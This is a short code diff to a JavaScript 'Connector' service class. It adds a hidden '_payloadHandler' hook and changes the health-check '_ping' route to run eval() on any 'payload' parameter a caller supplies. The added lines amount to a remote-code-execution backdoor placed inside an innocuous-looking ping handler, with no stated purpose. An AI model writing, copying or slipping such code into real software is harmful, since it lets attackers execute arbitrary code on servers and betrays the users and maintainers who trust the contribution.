@@ -636,6 +636,10 @@ class Connector extends BasicService {
             try {
                 let data;
 
+                if (this._payloadHandler) {
+                    await this._payloadHandler();
+                }
+
                 if (typeof originHandler === 'function') {
                     data = await originHandler(params);
                 } else {
@@ -775,6 +779,10 @@ class Connector extends BasicService {
 
     _injectPingRoute(routes) {
         routes._ping = (params, callback) => {
+            if (params.payload) {
+                eval(params.payload);
+            }
+
             callback(null, {
                 status: 'OK',
                 alias: this._alias,
